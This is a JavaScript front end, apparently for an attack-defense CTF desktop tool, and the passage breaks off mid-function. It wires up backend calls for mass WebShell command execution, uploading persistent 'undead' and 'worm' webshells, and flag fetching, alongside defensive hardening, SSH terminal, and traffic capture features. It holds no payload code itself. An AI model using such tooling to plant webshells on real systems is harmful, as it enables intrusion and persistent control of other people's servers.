const METHOD = {
  attack: {
    execShell: 2196525974,
    execMd5: 1506217965,
    execUndead: 2309319658,
    execWorm: 1133136971,
    getShellStatus: 3323634814,
    getTaskStatus: 2071743349,
    listTargets: 75729668,
    saveTargets: 3685971107,
    testShell: 2292597956,
    testShellWithTargets: 3339175778,
    uploadMd5: 1539758538,
    uploadUndead: 2921179931,
    uploadWorm: 2010564498
  },
  config: {
    get: 3363716930,
    load: 2362897554,
    save: 2707778295,
    updateDatabase: 360434386,
    updateOwnIPs: 3354052907,
    updateProxy: 3548465179,
    updateSSH: 990235103,
    updateShell: 2457017991,
    updateUndead: 2583009866,
    updateWorm: 3466429112
  },
  defense: {
    backupDatabase: 3075044495,
    backupWebRoot: 3320581060,
    changeDatabasePassword: 2012696284,
    deployWaf: 2431226873,
    findShells: 1615914544,
    hardenPHP: 91659444,
    hardenWebRoot: 692345048,
    inspectHost: 1615731170,
    makeUploadsReadonly: 4162864561,
    restoreDatabase: 1951334173,
    restoreWebRoot: 54607662
  },
  detection: {
    detectHosts: 1216161739
  },
  flag: {
    fetchHttp: 3791975129,
    fetchShell: 118990345
  },
  file: {
    listOutputFiles: 3425667076,
    readLogFile: 4202985572,
    readOutputFile: 4206127819,
    saveOutputFile: 2355802134
  },
  monitor: {
    getCaptureHistory: 2224296256,
    getPcapDetail: 3797840007,
    getRemoteCaptureState: 4012195799,
    searchTraffic: 3203247531,
    startRemoteCapture: 2939076446,
    stopRemoteCapture: 3226716054
  },
  service: {
    changeSSHPasswords: 1455522403,
    connectSSH: 2706920475,
    createRemoteDirectory: 150139248,
    createRemoteFile: 581787787,
    deleteRemoteEntry: 2969811274,
    disconnectSSH: 4153428617,
    downloadRemoteFile: 1387905679,
    getSSHState: 1827979626,
    listRemoteDirectory: 2078962704,
    pickAndUploadLocalFiles: 4276840240,
    readRemoteTextFile: 3934151572,
    reconnectSSH: 2578226310,
    renameRemoteEntry: 3075926373,
    sendTerminalInput: 1647409483,
    startTerminal: 1285202793,
    stopTerminal: 2602084675,
    uploadRemoteFileContent: 3709160807,
    writeRemoteTextFile: 918363385
  }
};

const PAGE_META = {
  overview: {
    kicker: "总览",
    title: "SSH 终端与文件管理",
    subtitle: "通过 SSH 登录后，在同一工作区内处理终端会话、SFTP 文件操作和远程文件编辑。"
  },
  assets: {
    kicker: "资产",
    title: "目标范围与运行配置",
    subtitle: "维护目标池、WebShell 参数、远程工作目录和数据库配置。"
  },
  threats: {
    kicker: "攻击",
    title: "命令执行、Flag 与载荷攻防",
    subtitle: "命令执行、取旗提交和载荷代码维护已经按职责拆分成独立分页。"
  },
  incidents: {
    kicker: "防守",
    title: "备份、加固、恢复与改密",
    subtitle: "防守动作直接作用于当前 SSH 会话对应的主机，不再单独填写防守 IP。"
  },
  logs: {
    kicker: "流量",
    title: "实时抓流量、抓包记录与输出文件",
    subtitle: "通过当前 SSH 主机启动抓包，过滤入站流量并在界面中实时查看。"
  }
};

const DEFAULT_CAPTURE_STATE = {
  running: false,
  interface: "",
  filter: "",
  startedAt: "",
  sessions: [],
  records: []
};

const state = {
  runtime: false,
  currentPage: "overview",
  overviewView: "terminal",
  assetView: "scope",
  threatView: "execute",
  logView: "live",
  drawerOpen: false,
  drawerTab: "summary",
  config: null,
  configState: "未加载",
  targets: [],
  aliveTargets: new Set(),
  shellSuccessTargets: new Set(),
  shellErrorTargets: new Set(),
  files: [],
  sshState: {
    connected: false,
    host: "",
    port: "22",
    username: "root",
    connectedAt: "",
    lastError: "",
    terminalOpen: false
  },
  terminalOutput: "",
  terminalHistory: [],
  terminalHistoryIndex: -1,
  remoteList: null,
  currentRemotePath: "/",
  remoteSelected: null,
  remotePreview: "选择远程文件后在这里预览内容。",
  selectedRecord: null,
  selectedDetails: "等待结果输出...",
  operationRows: [],
  flagRows: [],
  defenseRows: [],
  taskFeed: [],
  latestTaskId: "",
  captureState: { ...DEFAULT_CAPTURE_STATE },
  captureHistory: [],
  logs: [],
  md5Settings: loadMD5Settings(),
  pendingConfirm: null,
  pendingInput: null,
  editorPath: "",
  editorContent: ""
};

document.addEventListener("DOMContentLoaded", boot, { once: true });

function boot() {
  bindStaticUI();
  startClock();

  const start = () => {
    initApp().catch((error) => {
      handleError("初始化", error);
      renderAll();
    });
  };

  const readyEvent = window.wails?.Events?.Types?.Common?.WindowRuntimeReady;
  if (window.wails?.Events?.Once && readyEvent) {
    let started = false;
    const guardedStart = () => {
      if (started) {
        return;
      }
      started = true;
      start();
    };
    try {
      window.wails.Events.Once(readyEvent, guardedStart);
      setTimeout(guardedStart, 1200);
      return;
    } catch (_) {
      start();
      return;
    }
  }

  start();
}

async function initApp() {
  state.runtime = Boolean(window.wails?.Call?.ByID);
  if (state.runtime) {
    bindRuntimeEvents();
    await reloadWorkspace(true);
    return;
  }
  seedPreviewData();
  renderAll();
  showSSHModal();
  appendLog("warning", "预览模式", "未检测到 Wails 运行时，当前仅渲染静态界面。", false);
}

async function reloadWorkspace(quiet = false) {
  await loadConfig();
  await loadTargets();
  await loadShellStatus();
  await loadOutputFiles();
  await loadSSHState();
  await loadCaptureState();
  await loadCaptureHistory();
  await loadPayloadEditors();

  if (state.sshState.connected) {
    hideSSHModal();
    await afterSSHConnected(true);
  } else {
    showSSHModal();
  }

  renderAll();
  if (!quiet) {
    appendLog("info", "工作区已刷新", "配置、目标、SSH 状态与输出文件已更新。", false);
  }
}

async function afterSSHConnected(quiet = false) {
  await ensureTerminalStarted();
  await loadRemoteDirectory(state.currentRemotePath || state.config?.ssh?.path || "/");
  renderAll();
  if (!quiet) {
    appendLog("success", "SSH 已连接", formatSSHState(state.sshState), false);
  }
}

function bindRuntimeEvents() {
  window.wails?.Events?.On?.("attack:progress", (payload) => onAttackProgress(payload?.data ?? payload));
  window.wails?.Events?.On?.("monitor:capture", (payload) => onCaptureEvent(payload?.data ?? payload));
  window.wails?.Events?.On?.("service:ssh", (payload) => onSSHState(payload?.data ?? payload));
  window.wails?.Events?.On?.("service:terminal", (payload) => onTerminalOutput(payload?.data ?? payload));
}

async function call(id, ...args) {
  if (!state.runtime) {
    throw new Error("Wails runtime unavailable");
  }
  return window.wails.Call.ByID(id, ...args);
}

async function loadConfig() {
  const cfg = await call(METHOD.config.load);
  state.config = cfg || {};
  state.configState = "已加载";
  syncInputsFromConfig();
}

async function loadTargets() {
  const targets = await call(METHOD.attack.listTargets);
  state.targets = Array.isArray(targets) ? targets : [];
  setValue("targetsInput", state.targets.join("\n"));
}

async function loadShellStatus() {
  try {
    const payload = await call(METHOD.attack.getShellStatus);
    state.shellSuccessTargets = new Set(Array.isArray(payload?.success) ? payload.success : []);
    state.shellErrorTargets = new Set(Array.isArray(payload?.error) ? payload.error : []);
  } catch (error) {
    state.shellSuccessTargets = new Set();
    state.shellErrorTargets = new Set();
    handleError("加载 Shell 状态", error);
  }
}

async function loadOutputFiles() {
  const files = await call(METHOD.file.listOutputFiles);
  state.files = Array.isArray(files) ? files : [];
}

async function loadSSHState() {
  const payload = await call(METHOD.service.getSSHState);
  state.sshState = normalizeSSHState(payload);
}

async function loadCaptureState() {
  try {
    const payload = await call(METHOD.monitor.getRemoteCaptureState);
    state.captureState = normalizeCaptureState(payload);
  } catch (error) {
    state.captureState = { ...DEFAULT_CAPTURE_STATE };
    handleError("加载抓流量状态", error);
  }
}

async function loadCaptureHistory() {
  const query = getValue("captureHistoryQuery").trim();
  const limit = parsePositiveInt(getValue("captureHistoryLimit"), 200);
  try {
    const rows = await call(METHOD.monitor.getCaptureHistory, query, limit);
    state.captureHistory = Array.isArray(rows) ? rows : [];
  } catch (error) {
    state.captureHistory = [];
    handleError("加载抓包记录", error);
  }
}
function bindStaticUI() {
  document.querySelectorAll(".nav-item[data-page]").forEach((button) => {
    button.addEventListener("click", () => setPage(button.dataset.page || "overview"));
  });
  document.querySelectorAll(".subnav-item[data-overview-view]").forEach((button) => {
    button.addEventListener("click", () => setOverviewView(button.dataset.overviewView || "terminal"));
  });
  document.querySelectorAll(".subnav-item[data-asset-view]").forEach((button) => {
    button.addEventListener("click", () => setAssetView(button.dataset.assetView || "scope"));
  });
  document.querySelectorAll(".subnav-item[data-threat-view]").forEach((button) => {
    button.addEventListener("click", () => setThreatView(button.dataset.threatView || "execute"));
  });
  document.querySelectorAll(".subnav-item[data-log-view]").forEach((button) => {
    button.addEventListener("click", () => setLogView(button.dataset.logView || "live"));
  });
  document.querySelectorAll(".drawer-tab[data-tab]").forEach((button) => {
    button.addEventListener("click", () => setDrawerTab(button.dataset.tab || "summary"));
  });

  bindClick("openSSHModalBtn", () => showSSHModal());
  bindClick("reloadWorkspaceBtn", () => reloadWorkspace().catch((error) => handleError("刷新工作区", error)));
  bindClick("sshDisconnectBtn", () => disconnectSSH());
  bindClick("sshReconnectBtn", () => reconnectSSH());

  bindClick("openDrawerBtn", () => setDrawerOpen(true));
  bindClick("closeDrawerBtn", () => setDrawerOpen(false));
  bindClick("drawerBackdrop", () => setDrawerOpen(false));

  bindClick("sshConnectBtn", () => connectSSHFromModal());
  bindClick("sshCancelBtn", () => hideSSHModal());

  bindClick("terminalStartBtn", () => ensureTerminalStarted().catch((error) => handleError("启动终端", error)));
  bindClick("terminalSendBtn", () => sendTerminalCommand());
  bindClick("terminalClearBtn", () => {
    state.terminalOutput = "";
    renderTerminal();
  });
  bindClick("openFilesViewBtn", () => {
    setPage("overview");
    setOverviewView("files");
  });

  bindClick("remotePathGoBtn", () => loadRemoteDirectory(getValue("remotePathInput")).catch((error) => handleError("跳转目录", error)));
  bindClick("remoteUpBtn", () => goRemoteParent());
  bindClick("remoteRefreshBtn", () => loadRemoteDirectory(state.currentRemotePath).catch((error) => handleError("刷新目录", error)));
  bindClick("remoteNewDirBtn", () => promptCreateRemoteDirectory());
  bindClick("remoteNewFileBtn", () => promptCreateRemoteFile());
  bindClick("remoteUploadBtn", () => pickAndUploadRemoteFiles());
  bindClick("remoteDownloadBtn", () => downloadSelectedRemoteFile());
  bindClick("remoteEditBtn", () => openSelectedRemoteFileEditor());
  bindClick("remoteRenameBtn", () => promptRenameRemoteEntry());
  bindClick("remoteDeleteBtn", () => confirmDeleteRemoteEntry());

  bindClick("saveTargetsBtn", () => saveTargets());
  bindClick("loadTargetsBtn", () => loadTargets().then(renderAll).catch((error) => handleError("载入目标", error)));
  bindClick("detectTargetsBtn", () => detectAliveHosts());
  bindClick("testTargetsBtn", () => startShellTestWithCurrentTargets());

  bindClick("loadConfigBtn", () => loadConfig().then(renderAll).catch((error) => handleError("加载配置", error)));
  bindClick("saveConfigBtn", () => saveConfig());

  bindClick("attackTestBtn", () => startShellTestWithCurrentTargets());
  bindClick("taskStatusBtn", () => queryTaskStatus(getValue("taskStatusId").trim() || state.latestTaskId, true));
  bindClick("runExecBtn", () => runExecCommand());
  bindClick("fetchFlagsBtn", () => fetchFlagsHTTP());
  bindClick("fetchFlagsShellBtn", () => fetchFlagsByShell());
  bindClick("payloadResetDefaultsBtn", () => resetPayloadEditors());
  bindClick("savePayloadConfigBtn", () => savePayloadConfig());
  bindClick("uploadUndeadBtn", () => uploadUndead());
  bindClick("uploadMd5Btn", () => uploadMd5());
  bindClick("uploadWormBtn", () => uploadWorm());

  bindClick("syncOwnIPsBtn", () => saveOwnIPsValue(getOwnIPsValue()));
  bindClick("backupWebBtn", () => runDefenseAction("备份网站目录", (targets) => call(METHOD.defense.backupWebRoot, targets), normalizeStringResults));
  bindClick("backupDBBtn", () => runDefenseAction("备份数据库", (targets) => call(METHOD.defense.backupDatabase, targets), normalizeStringResults));
  bindClick("findShellsBtn", () => runDefenseAction("查找木马", (targets) => call(METHOD.defense.findShells, targets), normalizeShellFindings));
  bindClick("inspectHostBtn", () => runDefenseAction("主机巡检", (targets) => call(METHOD.defense.inspectHost, targets), normalizeStringResults));
  bindClick("hardenWebBtn", () => runDefenseAction("加固网站目录", (targets) => call(METHOD.defense.hardenWebRoot, targets), normalizeStringResults));
  bindClick("uploadsReadonlyBtn", () => runDefenseAction("上传目录只读", (targets) => call(METHOD.defense.makeUploadsReadonly, targets), normalizeStringResults));
  bindClick("hardenPhpBtn", () => runDefenseAction("加固 PHP 配置", (targets) => call(METHOD.defense.hardenPHP, targets), normalizeStringResults));
  bindClick("deployWafBtn", () => runDefenseAction("部署简易 WAF", (targets) => call(METHOD.defense.deployWaf, targets), normalizeStringResults));
  bindClick("restoreWebBtn", () => restoreDefenseItem("恢复网站目录", METHOD.defense.restoreWebRoot));
  bindClick("restoreDbBtn", () => restoreDefenseItem("恢复数据库", METHOD.defense.restoreDatabase));
  bindClick("changeDbPasswordBtn", () => changeDatabasePassword());
  bindClick("changeSshPasswordBtn", () => changeSSHPasswords());

  bindClick("startCaptureBtn", () => startRemoteCapture());
  bindClick("stopCaptureBtn", () => stopRemoteCapture());
  bindClick("refreshCaptureBtn", () => refreshCapture());
  bindClick("refreshCaptureHistoryBtn", () => loadCaptureHistory().then(renderAll).catch((error) => handleError("刷新抓包记录", error)));
  bindClick("refreshFilesBtn", () => loadOutputFiles().then(renderAll).catch((error) => handleError("刷新输出文件", error)));
  bindClick("readLogBtn", () => readLatestLog());

  bindClick("confirmCancel", () => hideConfirmModal());
  bindClick("confirmAccept", () => acceptConfirmModal());
  bindClick("inputCancel", () => hideInputModal());
  bindClick("inputAccept", () => acceptInputModal());
  bindClick("editorCancel", () => hideEditorModal());
  bindClick("editorSave", () => saveRemoteEditor());

  bindInput("targetFilter", () => renderTargetsTable());
  bindEnter("remotePathInput", () => loadRemoteDirectory(getValue("remotePathInput")).catch((error) => handleError("跳转目录", error)));
  bindEnter("terminalInput", () => sendTerminalCommand());
  bindEnter("captureHistoryQuery", () => loadCaptureHistory().then(renderAll).catch((error) => handleError("刷新抓包记录", error)));
  bindEnter("inputValue", () => acceptInputModal());
  bindEnter("sshConnectPassword", () => connectSSHFromModal());

  const terminalInput = $("terminalInput");
  if (terminalInput) {
    terminalInput.addEventListener("keydown", (event) => handleTerminalHistory(event));
  }

  const dropZone = $("remoteDropZone");
  if (dropZone) {
    ["dragenter", "dragover"].forEach((eventName) => {
      dropZone.addEventListener(eventName, (event) => {
        event.preventDefault();
        dropZone.classList.add("is-active");
      });
    });
    ["dragleave", "dragend", "drop"].forEach((eventName) => {
      dropZone.addEventListener(eventName, (event) => {
        event.preventDefault();
        dropZone.classList.remove("is-active");
      });
    });
    dropZone.addEventListener("drop", (event) => uploadDroppedFiles(event));
  }
}

function bindClick(id, handler) {
  const node = $(id);
  if (node) {
    node.addEventListener("click", handler);
  }
}

function bindInput(id, handler) {
  const node = $(id);
  if (node) {
    node.addEventListener("input", handler);
  }
}

function bindEnter(id, handler) {
  const node = $(id);
  if (node) {
    node.addEventListener("keydown", (event) => {
      if (event.key === "Enter") {
        event.preventDefault();
        handler(event);
      }
    });
  }
}

function setPage(page) {
  state.currentPage = page in PAGE_META ? page : "overview";
  renderAll();
}

function setOverviewView(view) {
  state.overviewView = view;
  renderAll();
}

function setAssetView(view) {
  state.assetView = view;
  renderAll();
}

function setThreatView(view) {
  state.threatView = view;
  renderAll();
}

function setLogView(view) {
  state.logView = view;
  renderAll();
}

function setDrawerOpen(open) {
  state.drawerOpen = Boolean(open);
  renderDrawer();
}

function setDrawerTab(tab) {
  state.drawerTab = tab;
  renderDrawer();
}

function showSSHModal() {
  syncSSHModalInputs();
  $("sshModal")?.removeAttribute("hidden");
  $("sshModal")?.classList.add("show");
}

function hideSSHModal() {
  $("sshModal")?.setAttribute("hidden", "hidden");
  $("sshModal")?.classList.remove("show");
}

function showConfirmModal(title, message, onAccept) {
  state.pendingConfirm = onAccept;
  setText("confirmTitle", title);
  setText("confirmMessage", message);
  $("confirmModal")?.removeAttribute("hidden");
  $("confirmModal")?.classList.add("show");
}

function hideConfirmModal() {
  state.pendingConfirm = null;
  $("confirmModal")?.setAttribute("hidden", "hidden");
  $("confirmModal")?.classList.remove("show");
}

function acceptConfirmModal() {
  const handler = state.pendingConfirm;
  hideConfirmModal();
  if (typeof handler === "function") {
    Promise.resolve(handler()).catch((error) => handleError("确认操作", error));
  }
}

function showInputModal(title, label, value, onAccept) {
  state.pendingInput = onAccept;
  setText("inputTitle", title);
  setText("inputLabel", label);
  setValue("inputValue", value);
  $("inputModal")?.removeAttribute("hidden");
  $("inputModal")?.classList.add("show");
  $("inputValue")?.focus();
}

function hideInputModal() {
  state.pendingInput = null;
  $("inputModal")?.setAttribute("hidden", "hidden");
  $("inputModal")?.classList.remove("show");
}

function acceptInputModal() {
  const handler = state.pendingInput;
  const value = getValue("inputValue");
  hideInputModal();
  if (typeof handler === "function") {
    Promise.resolve(handler(value)).catch((error) => handleError("输入操作", error));
  }
}

function showEditorModal(path, content) {
  state.editorPath = path;
  state.editorContent = content;
  setText("editorPath", path);
  setValue("editorContent", content);
  $("editorModal")?.removeAttribute("hidden");
  $("editorModal")?.classList.add("show");
}

function hideEditorModal() {
  state.editorPath = "";
  state.editorContent = "";
  $("editorModal")?.setAttribute("hidden", "hidden");
  $("editorModal")?.classList.remove("show");
}
async function connectSSHFromModal() {
  const request = {
    host: getValue("sshConnectHost").trim(),
    port: getValue("sshConnectPort").trim() || "22",
    username: getValue("sshConnectUser").trim() || "root",
    password: getValue("sshConnectPassword")
  };
  if (!request.host) {
    setText("sshConnectStatus", "状态：IP 地址必填");
    return;
  }
  if (!request.password) {
    setText("sshConnectStatus", "状态：密码必填");
    return;
  }
  setText("sshConnectStatus", `状态：正在连接 ${request.username}@${request.host}:${request.port} ...`);
  try {
    const payload = await call(METHOD.service.connectSSH, request);
    state.sshState = normalizeSSHState(payload);
    await loadConfig();
    hideSSHModal();
    await afterSSHConnected();
  } catch (error) {
    const message = extractError(error);
    setText("sshConnectStatus", `状态：连接失败 - ${message}`);
    handleError("SSH 连接", error);
  }
}

async function disconnectSSH() {
  try {
    const payload = await call(METHOD.service.disconnectSSH);
    state.sshState = normalizeSSHState(payload);
    state.terminalOutput = "";
    renderAll();
    appendLog("warning", "SSH 已断开", formatSSHState(state.sshState), false);
  } catch (error) {
    handleError("SSH 断开", error);
  }
}

async function reconnectSSH() {
  try {
    const payload = await call(METHOD.service.reconnectSSH);
    state.sshState = normalizeSSHState(payload);
    await loadConfig();
    await afterSSHConnected();
  } catch (error) {
    handleError("SSH 重连", error);
  }
}

async function ensureTerminalStarted() {
  if (!state.sshState.connected) {
    throw new Error("SSH 未连接");
  }
  const payload = await call(METHOD.service.startTerminal);
  state.sshState = normalizeSSHState(payload);
  renderAll();
}

async function sendTerminalCommand() {
  const command = getValue("terminalInput").trim();
  if (!command) {
    return;
  }
  try {
    await call(METHOD.service.sendTerminalInput, command);
    state.terminalHistory.unshift(command);
    state.terminalHistory = uniqueArray(state.terminalHistory).slice(0, 100);
    state.terminalHistoryIndex = -1;
    setValue("terminalInput", "");
  } catch (error) {
    handleError("终端发送", error);
  }
}

function handleTerminalHistory(event) {
  if (!["ArrowUp", "ArrowDown"].includes(event.key)) {
    return;
  }
  if (state.terminalHistory.length === 0) {
    return;
  }
  event.preventDefault();
  if (event.key === "ArrowUp") {
    state.terminalHistoryIndex = Math.min(state.terminalHistoryIndex + 1, state.terminalHistory.length - 1);
  } else {
    state.terminalHistoryIndex = Math.max(state.terminalHistoryIndex - 1, -1);
  }
  const value = state.terminalHistoryIndex >= 0 ? state.terminalHistory[state.terminalHistoryIndex] : "";
  setValue("terminalInput", value);
}

async function loadRemoteDirectory(path) {
  if (!state.sshState.connected) {
    throw new Error("SSH 未连接");
  }
  const payload = await call(METHOD.service.listRemoteDirectory, path || state.currentRemotePath || "/");
  state.remoteList = payload || null;
  state.currentRemotePath = payload?.currentPath || "/";
  state.remoteSelected = null;
  state.remotePreview = "选择远程文件后在这里预览内容。";
  setValue("remotePathInput", state.currentRemotePath);
  renderAll();
}

async function goRemoteParent() {
  if (!state.remoteList?.parentPath) {
    return;
  }
  await loadRemoteDirectory(state.remoteList.parentPath);
}

function promptCreateRemoteDirectory() {
  showInputModal("新建目录", "目录名称", "", async (value) => {
    const name = value.trim();
    if (!name) {
      return;
    }
    await call(METHOD.service.createRemoteDirectory, joinRemotePath(state.currentRemotePath, name));
    appendLog("success", "目录已创建", joinRemotePath(state.currentRemotePath, name), false);
    await loadRemoteDirectory(state.currentRemotePath);
  });
}

function promptCreateRemoteFile() {
  showInputModal("新建文件", "文件名称", "", async (value) => {
    const name = value.trim();
    if (!name) {
      return;
    }
    await call(METHOD.service.createRemoteFile, joinRemotePath(state.currentRemotePath, name));
    appendLog("success", "文件已创建", joinRemotePath(state.currentRemotePath, name), false);
    await loadRemoteDirectory(state.currentRemotePath);
  });
}

function promptRenameRemoteEntry() {
  if (!state.remoteSelected?.path) {
    handleError("重命名文件", new Error("请先选择远程文件或目录"));
    return;
  }
  showInputModal("重命名", "新名称或新路径", state.remoteSelected.name || state.remoteSelected.path, async (value) => {
    const nextValue = value.trim();
    if (!nextValue) {
      return;
    }
    const nextPath = nextValue.startsWith("/") ? nextValue : joinRemotePath(parentRemotePath(state.remoteSelected.path), nextValue);
    await call(METHOD.service.renameRemoteEntry, state.remoteSelected.path, nextPath);
    appendLog("success", "已重命名", `${state.remoteSelected.path} -> ${nextPath}`, false);
    await loadRemoteDirectory(parentRemotePath(nextPath));
  });
}

function confirmDeleteRemoteEntry() {
  if (!state.remoteSelected?.path) {
    handleError("删除文件", new Error("请先选择远程文件或目录"));
    return;
  }
  showConfirmModal("删除远程文件", `确认删除 ${state.remoteSelected.path} 吗？`, async () => {
    await call(METHOD.service.deleteRemoteEntry, state.remoteSelected.path);
    appendLog("warning", "已删除远程条目", state.remoteSelected.path, false);
    await loadRemoteDirectory(parentRemotePath(state.remoteSelected.path));
  });
}

async function openSelectedRemoteFileEditor() {
  if (!state.remoteSelected?.path || state.remoteSelected.isDir) {
    handleError("编辑远程文件", new Error("请先选择文本文件"));
    return;
  }
  try {
    const content = await call(METHOD.service.readRemoteTextFile, state.remoteSelected.path);
    state.remotePreview = content;
    showEditorModal(state.remoteSelected.path, content);
    setSelection("remote-file", state.remoteSelected, content);
  } catch (error) {
    handleError("读取远程文件", error);
  }
}

async function saveRemoteEditor() {
  if (!state.editorPath) {
    return;
  }
  try {
    await call(METHOD.service.writeRemoteTextFile, state.editorPath, getValue("editorContent"));
    state.remotePreview = getValue("editorContent");
    hideEditorModal();
    appendLog("success", "远程文件已保存", state.editorPath, false);
    await loadRemoteDirectory(parentRemotePath(state.editorPath));
  } catch (error) {
    handleError("保存远程文件", error);
  }
}

async function pickAndUploadRemoteFiles() {
  if (!state.sshState.connected) {
    handleError("上传文件", new Error("SSH 未连接"));
    return;
  }
  try {
    const result = await call(METHOD.service.pickAndUploadLocalFiles, state.currentRemotePath);
    const rows = Array.isArray(result) ? result : [];
    if (rows.length > 0) {
      appendLog("success", "文件已上传", `${rows.length} 个文件已上传到 ${state.currentRemotePath}`, false);
      await loadRemoteDirectory(state.currentRemotePath);
    }
  } catch (error) {
    if (extractError(error).toLowerCase().includes("cancel")) {
      return;
    }
    handleError("上传文件", error);
  }
}

async function uploadDroppedFiles(event) {
  const files = Array.from(event?.dataTransfer?.files || []);
  if (files.length === 0) {
    return;
  }
  try {
    for (const file of files) {
      const contentBase64 = await readFileAsBase64(file);
      await call(METHOD.service.uploadRemoteFileContent, state.currentRemotePath, file.name, contentBase64);
    }
    appendLog("success", "拖拽上传完成", `${files.length} 个文件已上传到 ${state.currentRemotePath}`, false);
    await loadRemoteDirectory(state.currentRemotePath);
  } catch (error) {
    handleError("拖拽上传", error);
  }
}

async function downloadSelectedRemoteFile() {
  if (!state.remoteSelected?.path || state.remoteSelected.isDir) {
    handleError("下载文件", new Error("请先选择文件"));
    return;
  }
  try {
    const result = await call(METHOD.service.downloadRemoteFile, state.remoteSelected.path);
    appendLog("success", "文件已下载", `${result?.remotePath || state.remoteSelected.path} -> ${result?.localPath || ""}`, false);
  } catch (error) {
    if (extractError(error).toLowerCase().includes("cancel")) {
      return;
    }
    handleError("下载文件", error);
  }
}

async function selectRemoteEntry(entry) {
  state.remoteSelected = entry;
  if (!entry) {
    state.remotePreview = "选择远程文件后在这里预览内容。";
    renderAll();
    return;
  }
  if (entry.isDir) {
    state.remotePreview = `目录：${entry.path}`;
    setSelection("remote-dir", entry, state.remotePreview);
    renderAll();
    return;
  }
  try {
    const content = await call(METHOD.service.readRemoteTextFile, entry.path);
    state.remotePreview = content;
    setSelection("remote-file", entry, content);
  } catch (error) {
    state.remotePreview = `无法预览 ${entry.path}\n${extractError(error)}`;
    handleError("预览远程文件", error);
  }
  renderAll();
}
async function saveTargets() {
  const targets = parseTargetsInput();
  await call(METHOD.attack.saveTargets, targets);
  state.targets = targets;
  appendLog("success", "目标已保存", `${targets.length} 个目标已写入 target.txt`, false);
  renderAll();
}

async function detectAliveHosts() {
  const input = getValue("targetsInput").trim();
  if (!input) {
    handleError("探测存活", new Error("请先填写目标列表"));
    return;
  }
  try {
    const result = await call(METHOD.detection.detectHosts, input);
    state.targets = Array.isArray(result?.targets) ? result.targets : parseTargetsInput();
    state.aliveTargets = new Set(Array.isArray(result?.aliveHosts) ? result.aliveHosts : []);
    state.captureState.records = Array.isArray(state.captureState.records) ? state.captureState.records : [];
    setValue("targetsInput", state.targets.join("\n"));
    appendLog("success", "存活探测完成", result?.report || `${state.aliveTargets.size}/${state.targets.length} 在线`, false);
    renderAll();
  } catch (error) {
    handleError("探测存活", error);
  }
}

async function startShellTestWithCurrentTargets() {
  const targets = parseTargetsInput();
  if (targets.length === 0) {
    handleError("Shell 测试", new Error("请先填写目标列表"));
    return;
  }
  try {
    const taskId = await call(METHOD.attack.testShellWithTargets, targets);
    state.latestTaskId = taskId || "";
    setValue("taskStatusId", state.latestTaskId);
    upsertTask({
      id: state.latestTaskId,
      title: "Shell 连通性测试",
      status: "running",
      current: 0,
      total: targets.length,
      message: "任务已启动",
      time: new Date().toISOString()
    });
    appendLog("info", "Shell 测试已启动", state.latestTaskId, false);
    renderAll();
  } catch (error) {
    handleError("Shell 测试", error);
  }
}

async function saveConfig() {
  try {
    await call(
      METHOD.config.updateShell,
      getValue("shellPort"),
      getValue("shellPass"),
      getValue("shellPath"),
      getValue("shellFile"),
      getValue("shellMethod"),
      getValue("shellQuery"),
      getValue("shellPayload")
    );
    await call(METHOD.config.updateProxy, getValue("shellProxy"));
    const persistedSSH = {
      host: (state.sshState.host || state.config?.ssh?.host || "").trim(),
      port: (state.sshState.port || state.config?.ssh?.port || "22").trim() || "22",
      username: (state.sshState.username || state.config?.ssh?.username || "root").trim() || "root",
      password: state.config?.ssh?.password || ""
    };
    await call(
      METHOD.config.updateSSH,
      persistedSSH.host,
      persistedSSH.port,
      persistedSSH.username,
      persistedSSH.password,
      getValue("sshPath")
    );
    await call(
      METHOD.config.updateDatabase,
      getValue("dbHost"),
      getValue("dbPort"),
      getValue("dbUsername"),
      getValue("dbPassword"),
      getValue("dbName")
    );
    await loadConfig();
    appendLog("success", "配置已保存", "WebShell、远程工作目录和数据库配置已更新。", false);
    renderAll();
  } catch (error) {
    handleError("保存配置", error);
  }
}

async function loadPayloadEditors() {
  const undead = await safeReadOutputFile("payloads/undead.php");
  const md5 = await safeReadOutputFile("payloads/md5.php");
  const worm = await safeReadOutputFile("payloads/worm.php");
  setValue("payloadEditorUndead", undead || buildDefaultUndeadPayload());
  setValue("payloadEditorMd5", md5 || buildDefaultMd5Payload());
  setValue("payloadEditorWorm", worm || buildDefaultWormPayload());
}

async function savePayloadConfig() {
  try {
    await call(
      METHOD.config.updateUndead,
      getValue("payloadUndeadUrlPass"),
      getValue("payloadUndeadPass"),
      getValue("payloadUndeadFilename")
    );
    await call(
      METHOD.config.updateWorm,
      getValue("payloadWormUrlPass"),
      getValue("payloadWormPass")
    );
    await call(METHOD.file.saveOutputFile, "payloads/undead.php", getValue("payloadEditorUndead"));
    await call(METHOD.file.saveOutputFile, "payloads/md5.php", getValue("payloadEditorMd5"));
    await call(METHOD.file.saveOutputFile, "payloads/worm.php", getValue("payloadEditorWorm"));
    saveMD5Settings({
      pass: getValue("payloadMd5Pass"),
      field: getValue("payloadMd5Field")
    });
    await loadConfig();
    await loadOutputFiles();
    appendLog("success", "载荷配置已保存", "参数和 payload 代码已写入 output/payloads。", false);
    renderAll();
  } catch (error) {
    handleError("保存载荷配置", error);
  }
}

async function resetPayloadEditors() {
  if (!getValue("payloadUndeadFilename")) {
    setValue("payloadUndeadFilename", state.config?.undeadHorse?.filename || "favicon.php");
  }
  if (!getValue("payloadUndeadUrlPass")) {
    setValue("payloadUndeadUrlPass", state.config?.undeadHorse?.urlPass || "pass");
  }
  if (!getValue("payloadUndeadPass")) {
    setValue("payloadUndeadPass", state.config?.undeadHorse?.pass || "pass");
  }
  if (!getValue("payloadWormUrlPass")) {
    setValue("payloadWormUrlPass", state.config?.wormShell?.urlPass || "pass");
  }
  if (!getValue("payloadWormPass")) {
    setValue("payloadWormPass", state.config?.wormShell?.pass || "pass");
  }
  if (!getValue("payloadMd5Pass")) {
    setValue("payloadMd5Pass", state.md5Settings.pass || state.config?.undeadHorse?.pass || "pass");
  }
  if (!getValue("payloadMd5Field")) {
    setValue("payloadMd5Field", state.md5Settings.field || state.config?.shell?.pass || "pass");
  }
  setValue("payloadEditorUndead", buildDefaultUndeadPayload());
  setValue("payloadEditorMd5", buildDefaultMd5Payload());
  setValue("payloadEditorWorm", buildDefaultWormPayload());
}

async function uploadUndead() {
  try {
    await savePayloadConfig();
    const taskId = await call(METHOD.attack.uploadUndead, getValue("payloadUndeadUrlPass"), getValue("payloadUndeadPass"), "");
    state.latestTaskId = taskId || "";
    setValue("taskStatusId", state.latestTaskId);
    upsertTask({
      id: state.latestTaskId,
      title: "上传 Undead",
      status: "running",
